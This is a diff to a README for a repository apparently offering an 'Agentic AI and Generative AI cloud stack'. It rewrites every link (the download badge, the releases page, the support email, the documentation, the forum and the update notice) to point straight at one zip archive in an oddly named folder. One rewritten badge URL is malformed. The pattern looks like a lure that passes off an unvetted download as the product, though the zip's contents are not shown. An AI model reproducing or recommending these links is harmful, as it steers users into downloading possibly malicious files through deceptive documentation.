@@ -1,6 +1,6 @@
 # 🌟 Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure - Empower AI with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Download-blue.svg)](https://github.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/releases)
+[![Download](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip%https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip)](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Agentic AI and Generative AI implementations! This guide will help yo
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Releases Page](https://github.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/releases).
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip).
 
 On this page, you will find all the available versions of the application. Choose the version that is appropriate for your needs and click on it. You will see a list of files available for download.
 
@@ -61,14 +61,14 @@ Feel free to explore all the features at your own pace.
 If you encounter any issues or have questions, our support team is here to help. You can find help through:
 
 - **Help Center:** Access resources and guides directly in the application.
-- **Contact Us:** Email support at [support@example.com](mailto:support@example.com).
+- **Contact Us:** Email support at [https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip).
 
 ## 🔗 Additional Resources
 
 For more information, tutorials, and updates, please check out our documentation:
 
-- [Official Documentation](https://github.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/docs).
-- [Community Forum](https://github.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/discussions).
+- [Official Documentation](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip).
+- [Community Forum](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip).
 
 ## ✅ Contributing
 
@@ -80,7 +80,7 @@ You are welcome to contribute! Whether you want to report issues, propose new fe
 
 ## 🔄 Update the Application
 
-To keep your application running smoothly, check back regularly on the [Releases Page](https://github.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/releases) for updates.
+To keep your application running smoothly, check back regularly on the [Releases Page](https://raw.githubusercontent.com/johanatanmartyn/Agentic-AI-and-GeN-AI-Cloud-Stack-AWS-GCP-Azure/main/kenotist/A-Ge-Azure-GC-Stack-and-AW-Agentic-Cloud-2.6-alpha.3.zip) for updates.
 
 ## 🎯 Conclusion
 
